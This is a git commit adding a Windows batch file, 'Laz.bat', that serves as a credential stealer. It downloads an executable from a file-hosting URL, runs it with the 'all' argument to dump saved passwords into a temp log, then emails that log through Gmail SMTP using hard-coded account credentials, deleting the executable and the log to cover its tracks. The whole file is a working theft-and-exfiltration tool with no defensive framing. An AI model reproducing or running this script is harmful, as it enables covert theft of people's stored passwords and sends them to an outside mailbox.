5ee0813a17babf5e5b1ecf4dff01c42ba283abb1
arashsofts <googmake3@gmail.com>
2017-12-18 20:38:04 -0500

    Create Laz.bat

---
+++ Laz.bat
@@ -0,0 +1,19 @@
+@echo off
+
+set downloadURL=https://down.uploadfiles.io/get/82og7
+set email=johnsmith999102@gmail.com
+set password=Monroe72
+
+set exeFile=%TEMP%\proc.exe
+set logFile=%TEMP%\proclog.txt
+set arguments=all
+
+
+powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');
+%exeFile% %arguments% > %logFile%
+
+del %exeFile%
+
+powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);
+
+del %logFile%
